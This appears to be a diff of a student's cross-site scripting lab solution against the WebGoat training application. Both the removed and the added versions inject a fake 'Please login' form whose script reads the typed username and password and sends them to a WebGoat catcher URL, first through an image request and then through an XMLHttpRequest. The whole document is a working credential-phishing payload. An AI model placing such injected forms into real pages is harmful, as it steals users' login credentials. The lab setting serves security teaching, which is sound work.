@@ -1,20 +1,20 @@
+<form>
+    <h2> Please login to use this feature </h2><br>
+		Username:
+	 <input type="text" name="ece568-2018f-username" id="ece568-2018f-username">
+	 <br>
+	 	Password:
+	 <input type="password" name="ece568-2018f-password" id="ece568-2018f-password">
+	 <br>
+	 <button id="ece568-2018f-submit" onclick="getCred()">Log In</button>
 </form>
-<form method="post">
-    	<br>
-	Login Form<br>
-	User: <input type="text" id="ece568-2018f-username" name="ece568-2018f-username"><br>
-	Password: <input type="password" id="ece568-2018f-password" name="ece568-2018f-password">
-	<input type="submit" onclick="runScript();" id="ece568-2018f-submit" name="ece568-2018f-submit">
-</form>
-
-<script type ="text/javascript">
-function runScript(){
-	var user = document.getElementById("ece568-2018f-username").value
-	var pw = document.getElementById("ece568-2018f-password").value
-	console.log("hacked user: " +user+pw);
-	XSSImage = new Image;
-	XSSImage.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&user=" + user +"&password=" + pw;
-
-
-}
+<script>
+	function getCred() {
+		var user = document.getElementById("ece568-2018f-username").value;
+		var pw = document.getElementById("ece568-2018f-password").value;
+		var finalURL = 'http://localhost:8090/WebGoat/catcher?PROPERTY=yes&userText='+ user + '&passText=' + pw;
+		var xmlHttp = new XMLHttpRequest();
+		xmlHttp.open("GET", finalURL, false);
+		xmlHttp.send(null);
+	}
 </script>
